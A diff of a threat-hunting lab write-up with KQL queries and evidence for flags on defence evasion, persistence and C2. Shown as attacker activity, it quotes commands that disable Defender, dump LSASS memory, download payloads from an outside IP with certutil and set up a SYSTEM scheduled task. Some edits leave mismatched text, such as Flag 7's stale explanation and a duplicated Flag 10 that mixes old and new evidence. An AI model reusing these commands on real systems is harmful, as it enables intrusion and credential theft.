@@ -196,135 +196,153 @@ DeviceProcessEvents
 
 ---
 
-🚩 **Flag 5 – Defender Configuration Recon**  
-🎯 **Objective:** Expose tampering or inspection of AV defenses, disguised under HR activity.  
-📌 **Finding (answer):** `"powershell.exe" -Command "Set-MpPreference -DisableRealtimeMonitoring $true"`  
+🚩 **Flag 5 – DEFENCE EVASION - File Extension Exclusions**  
+🎯 **Objective:** Look for any possible Window Defender file extension exclusions and count them.  
+📌 **Finding (answer):** 3  
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamps:** 2025-07-18T14:58:41Z and 2025-07-18T15:00:06Z  
-- **Process:** powershell.exe  
-- **CommandLine:** `Set-MpPreference -DisableRealtimeMonitoring $true`  
-- **SHA256:** `9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3`  
-💡 **Why it matters:** Disables Defender’s real‑time protection to permit payload staging/credential theft with reduced detection.
-**KQL Query Used:**
-```
-DeviceProcessEvents
-| where DeviceName contains "nathan-iel-vm"
-| where ProcessCommandLine contains "RealTimeMonitoring"
-| project Timestamp, DeviceName, FileName, ProcessCommandLine, ProcessCreationTime,InitiatingProcessCommandLine , InitiatingProcessCreationTime, SHA256
-```
-<img width="797" height="613" alt="Screenshot 2025-08-17 220314" src="https://github.com/user-attachments/assets/5aafbc90-ff20-4695-bc12-d6e5ae757ab4" />
+- **Host:** "azuki-sl"  
+- **Timestamps:** 2025-11-19T18:49:27.7301011Z - 2025-11-19T18:49:29.1787135Z  
+- **Process:** Windows Resistry
+- **ActionType:** RegistryValueSet
+- **RegistryValueName's:** `.bat,  .ps1, .exe`  <br/>
+💡 **Why it matters:** These exclusions reveals the scope of the attacker's defense evasion strategy.<br/>
 
----
-
-🚩 **Flag 6 – Defender Policy Modification**  
-🎯 **Objective:** Validate if core system protection settings were modified.  
-📌 **Finding (answer):** **DisableAntiSpyware** (registry value name)  
-🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamp:** 2025-07-18T14:38:21Z  
-- **ActionType:** RegistryValueSet  
-- **RegistryKey:** `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`  
-- **RegistryValueName:** `DisableAntiSpyware` → **1**  
-💡 **Why it matters:** Weakens baseline protections at policy level; corroborates defense evasion.
 **KQL Query Used:**
 ```
 DeviceRegistryEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where ActionType == "RegistryValueSet"
-| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, PreviousRegistryKey, PreviousRegistryValueData, PreviousRegistryValueName
+| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
+| where RegistryKey contains "Windows Defender\\Exclusions\\Extensions"
+| project TimeGenerated, ActionType, DeviceName, RegistryValueName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
 ```
-<img width="868" height="792" alt="Screenshot 2025-08-17 220703" src="https://github.com/user-attachments/assets/3a95118b-7155-43a7-a5cb-2cbc0bd0a090" />
+<img width="997" height="275" alt="Flag5" src="https://github.com/user-attachments/assets/83a80da3-1410-4461-adb9-57106ef0c4ab" />
+
 
 ---
 
-🚩 **Flag 7 – Access to Credential-Rich Memory Space**  
-🎯 **Objective:** Identify if the attacker dumped memory content from a sensitive process.  
-📌 **Finding (answer):** HR-related dump file disguise = **HRConfig.json**  
+🚩 **Flag 6 – DEFENCE EVASION - Temporary Folder Exclusion**  
+🎯 **Objective:** Find folder path exclusions to Windows Defender to prevent scanning of directories.  
+📌 **Finding (answer):** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamps:** 2025-07-18T15:10:47Z & 15:12:27Z  
-- **Process:** `rundll32.exe`  
+- **Host:** "azuki-sl"  
+- **Timestamp:** 2025-11-19T18:49:27.6830204Z  
+- **RegistryKey:** `Windows Defender\\Exclusions\\Paths`  
+- **RegistryValueName:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`  <br/>
+💡 **Why it matters:** These exclusions allow malware to run undetected.<br/>
+
+**KQL Query Used:**
+```
+DeviceRegistryEvents
+| where TimeGenerated between (datetime(2025-11-01T00:30:11.6770861Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl", "azuki-kslog", "azuki-logks", "azuki-wks01", "azuki-logistics")
+| where RegistryKey contains "Windows Defender\\Exclusions\\Paths"
+| project TimeGenerated, ActionType, DeviceName, InitiatingProcessFolderPath, RegistryKey, RegistryValueName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+
+```
+<img width="1236" height="541" alt="Flag6" src="https://github.com/user-attachments/assets/ae1d664f-5b24-42ee-a001-31b3c0987f9d" />
+
+
+---
+
+🚩 **Flag 7 – DEFENCE EVASION - Download Utility Abuse**  
+🎯 **Objective:** Identify legitimate system utilities used to download malware.  
+📌 **Finding (answer):** certutil.exe 
+🔍 **Evidence:**  
+- **Host:** "azuki-sl"  
+- **Timestamps:** 2025-11-19T19:07:21.0804181Z  
+- **Process:** `certutil.exe`  
 - **CommandLines:**  
-  - `"rundll32.exe" C:\Windows\System32\comsvcs.dll, MiniDump 7784 C:\HRTools\HRConfig.json full`  
-  - `"rundll32.exe" C:\Windows\System32\comsvcs.dll, MiniDump 716 C:\HRTools\HRConfig.json full`  
-- **Initiating:** powershell.exe  
-- **SHA256:** `076592ca1957f8357cc201f0015072c612f5770ad7de85f87f254253c754dd7`  
-💡 **Why it matters:** comsvcs.dll MiniDump likely targeted LSASS; output masked as HR config to blend with business activity.
+  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe`  
+  - `"certutil.exe" -urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe`  
+- **Initiating:** powershell.exe  <br/>
+💡 **Why it matters:** comsvcs.dll MiniDump likely targeted LSASS; output masked as HR config to blend with business activity. <br/>
+
 **KQL Query Used:**
 ```
 DeviceProcessEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where ProcessCommandLine contains "Dump"
-| project Timestamp, DeviceId, FileName, ProcessCommandLine, ProcessCreationTime,InitiatingProcessCommandLine , InitiatingProcessCreationTime, SHA256
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl")
+| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
+| where ActionType == "ProcessCreated"
+| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
+| sort by Timestamp desc
 
 ```
-<img width="879" height="567" alt="Screenshot 2025-08-17 221121" src="https://github.com/user-attachments/assets/1c15856c-3250-4f8d-ad99-5cc96f053f63" />
+<img width="1124" height="645" alt="Flag7" src="https://github.com/user-attachments/assets/33210209-377a-40d8-8b09-7964822f2802" />
+
 
 ---
 
-🚩 **Flag 8 – File Inspection of Dumped Artifacts**  
-🎯 **Objective:** Detect whether memory dump contents were reviewed post‑collection.  
-📌 **Finding (answer):** `"notepad.exe" C:\HRTools\HRConfig.json`  
-🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Timestamp:** 2025-07-18T15:13:16Z  
-- **Process:** notepad.exe (initiated by powershell.exe)  
-- **SHA256:** `da5807bb0997ccb5132950ec87eda2b33b1ac4533cf17a22a6f3b576ed7c5b`  
-💡 **Why it matters:** Confirms post‑dump review/validation of harvested credentials or secrets.
+🚩 **Flag 8 – PERSISTENCE - Scheduled Task Name**  
+🎯 **Objective:**  Identify the name of the scheduled task created for persistence. 
+📌 **Finding (answer):** `Windows Update Check`  
+🔍 **Evidence:** 
+- **Host:** "azuki-sl"  
+- **Timestamp:** 2025-11-19T19:07:46.9796512Z  
+- **Process:** schtasks.exe (initiated by powershell.exe)
+- **CommandLine:**  
+  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
+💡 **Why it matters:** Scheduled tasks provide reliable persistence across system reboots.<br/>
+
 **KQL Query Used:**
 ```
-DeviceProcessEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where ProcessCommandLine contains "HRConfig.json"
-| project Timestamp, DeviceId, FileName, ProcessCommandLine, ProcessCreationTime,InitiatingProcessCommandLine , InitiatingProcessCreationTime, SHA256
+ DeviceProcessEvents
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl")
+| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
+| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
+| sort by Timestamp desc
+
 ```
-<img width="760" height="268" alt="Screenshot 2025-08-17 221257" src="https://github.com/user-attachments/assets/cd60c854-428b-4fde-aa35-a48941216c7e" />
+<img width="1133" height="633" alt="Flag8" src="https://github.com/user-attachments/assets/1beb5e9b-f1a9-443e-a986-0d27b576c3da" />
+
 
 ---
 
-🚩 **Flag 9 – Outbound Communication Test**  
-🎯 **Objective:** Catch network activity establishing contact outside the environment.  
-📌 **Finding (answer):** **.net** (TLD of unusual outbound domain)  
+🚩 **Flag 9 – PERSISTENCE - Scheduled Task Target**  
+🎯 **Objective:** Identify the executable path configured in the scheduled task.  
+📌 **Finding (answer):** `C:\ProgramData\WindowsCache\svchost.exe`
 🔍 **Evidence:**  
-- **Host:** nathan-iel-vm  
-- **Suspicious Domain:** `eo7j1sn715wkekj.m.pipedream.net` (amid mostly Microsoft `*.msedge.net`/`*.azureedge.net`)  
-💡 **Why it matters:** Non‑standard webhook/C2 infrastructure used as low‑profile beacon prior to exfiltration.
+- **Host:** "azuki-sl"  
+- **Timestamp:** 2025-11-19T19:07:46.9796512Z
+- **CommandLine:**  
+  - `"schtasks.exe" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f` <br/>
+💡 **Why it matters:** This scheduled task path defines what executes at runtime. This reveals the exact persistence mechanism and the malware location.<br/>
+
+**KQL Query Used:**
+```
+ DeviceProcessEvents
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where DeviceName has_any ("azuki-sl")
+| where InitiatingProcessRemoteSessionIP has_any ("192.168.1.45")
+| where ProcessCommandLine has_any ("schtasks.exe", "\\create")
+| sort by Timestamp desc
+
+```
+
+---
+
+🚩 **Flag 10 – COMMAND & CONTROL - C2 Server Address**  
+🎯 **Objective:** Identify the IP address of the command and control server.  
+📌 **Finding (answer):** Unusual outbound connection → **78.141.196.6**  
+🔍 **Evidence:**  
+- **Host:** "azuki-sl" · **ActionType:** ConnectionSuccess  
+- **Timestamp:** 2025-11-19T19:11:04.1766386Z <br/>
+💡 **Why it matters:** Identifying C2 servers enables network blocking and infrastructure tracking. <br/>
+
 **KQL Query Used:**
 ```
 DeviceNetworkEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where RemoteUrl != ""
-| where RemoteUrl !contains ".com"
-| summarize Count = count() by RemoteUrl
-| sort by Count desc
-```
-<img width="498" height="575" alt="Screenshot 2025-08-17 221558" src="https://github.com/user-attachments/assets/ff3a81e7-bcd1-43fb-a85c-169e54aeb922" />
+| where Timestamp between (datetime(2025-11-18T22:00:00.00Z) .. datetime(2025-11-22T23:00:00.00Z))
+| where InitiatingProcessFolderPath contains "C:\\ProgramData\\WindowsCache\\svchost.exe"
 
----
+```
 
-🚩 **Flag 10 – Covert Data Transfer**  
-🎯 **Objective:** Uncover evidence of internal data leaving the environment.  
-📌 **Finding (answer):** Last unusual outbound connection → **52.54.13.125**  
-🔍 **Evidence:**  
-- **Host:** nathan-iel-vm · **ActionType:** ConnectionSuccess  
-- **RemoteUrl:** `eo7j1sn715wkekj.m.pipedream.net`  
-- **Sequence:** 52.55.234.111 → **52.54.13.125** (last at 2025-07-18T15:28:44Z)  
-💡 **Why it matters:** Validates egress path to external service consistent with data staging/exfil.
-**KQL Query Used:**
-```
-DeviceNetworkEvents
-| where Timestamp between (datetime(2025-07-18) .. datetime(2025-07-31))
-| where DeviceName contains "nathan-iel-vm"
-| where RemoteUrl !~ ""
-| where RemoteUrl contains "pipedream.net"
-| project Timestamp, DeviceName, ActionType, RemoteIP, RemoteUrl
-```
-<img width="492" height="411" alt="Screenshot 2025-08-17 221959" src="https://github.com/user-attachments/assets/3497fc89-96b0-4dff-955d-1ef4930d7e02" />
+<img width="1086" height="637" alt="Flag10" src="https://github.com/user-attachments/assets/3659fb48-af93-40d4-bc06-7d1e4f04e098" />
+
 
 
 ---
@@ -439,6 +457,16 @@ DeviceProcessEvents
 - **Path:** `C:\Temp\EmptySysmonConfig.xml`  
 - **Host:** nathan-iel-vm · **Initiating:** powershell.exe  
 💡 **Why it matters:** Blinds Sysmon to suppress detection just prior to exit; ties off anti‑forensics chain.
+
+🚩 **Flag 10 – COMMAND & CONTROL - C2 Server Address**  
+🎯 **Objective:** Identify the IP address of the command and control server.  
+📌 **Finding (answer):** Last unusual outbound connection → **78.141.196.6**  
+🔍 **Evidence:**  
+- **Host:** nathan-iel-vm · **ActionType:** ConnectionSuccess  
+- **RemoteUrl:** `eo7j1sn715wkekj.m.pipedream.net`  
+- **Sequence:** 52.55.234.111 → **52.54.13.125** (last at 2025-07-18T15:28:44Z)  
+💡 **Why it matters:** Validates egress path to external service consistent with data staging/exfil.
+
 **KQL Query Used:**
 ```
 DeviceFileEvents
